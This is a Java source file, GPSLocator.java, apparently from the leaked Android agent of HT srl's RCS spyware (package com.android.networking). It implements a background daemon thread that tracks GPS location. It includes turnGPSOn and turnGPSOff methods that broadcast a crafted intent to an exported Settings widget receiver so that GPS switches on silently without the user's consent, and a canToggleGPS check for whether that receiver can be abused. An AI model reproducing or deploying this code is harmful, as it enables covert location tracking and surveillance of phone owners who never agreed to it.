/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocator.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.position;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Looper;
import android.provider.Settings;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public abstract class GPSLocator extends Thread {
	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
	protected LocationManager lm;
	protected LocationListener listener;

	protected String provider = LocationManager.GPS_PROVIDER;
	private Looper myLooper;

	public GPSLocator() {
		setDaemon(true);
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
	}

	public abstract void initLocationUpdates();

	@Override
	public void run() {
		Looper.prepare();
		initLocationUpdates();

		myLooper = Looper.myLooper();
		Looper.loop();
	}

	public GPSLocator(LocationListener listener) {
		setListener(listener);
	}

	protected void setListener(LocationListener listener) {
		this.listener = listener;
	}

	public Location getLastKnownPosition() {
		return lm.getLastKnownLocation(provider);
	}

	public void halt() {
		if (listener != null && lm != null) {
			lm.removeUpdates(listener);
		}

		lm = null;

		if (myLooper != null) {
			myLooper.quit();
		}
	}

	public void turnGPSOn() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (turnGPSOn)");
		}
		String provider = Settings.Secure.getString(Status.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

		if (!provider.contains("gps")) { // if gps is disabled
			final Intent poke = new Intent();
			poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
			poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
			poke.setData(Uri.parse("3"));
			Status.getAppContext().sendBroadcast(poke);
		}
	}

	public void turnGPSOff() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (turnGPSOff)");
		}
		String provider = Settings.Secure.getString(Status.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

		if (provider.contains("gps")) { // if gps is enabled
			final Intent poke = new Intent();
			poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
			poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
			poke.setData(Uri.parse("3"));
			Status.getAppContext().sendBroadcast(poke);
		}
	}

	public boolean canToggleGPS() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (canToggleGPS)");
		}
		PackageManager pacman = Status.getAppContext().getPackageManager();
		PackageInfo pacInfo = null;

		try {
			pacInfo = pacman.getPackageInfo("com.android.settings", PackageManager.GET_RECEIVERS);
		} catch (NameNotFoundException e) {
			return false; // package not found
		}

		if (pacInfo != null) {
			for (ActivityInfo actInfo : pacInfo.receivers) {
				// test if recevier is exported. if so, we can toggle GPS.
				if (actInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider") && actInfo.exported) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (canToggleGPS): YES");
					}
					return true;
				}
			}
		}

		return false; // default
	}

	public boolean isGPSEnabled() {
		boolean enabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (isGPSEnabled): " + enabled);
		}
		return enabled;
	}
}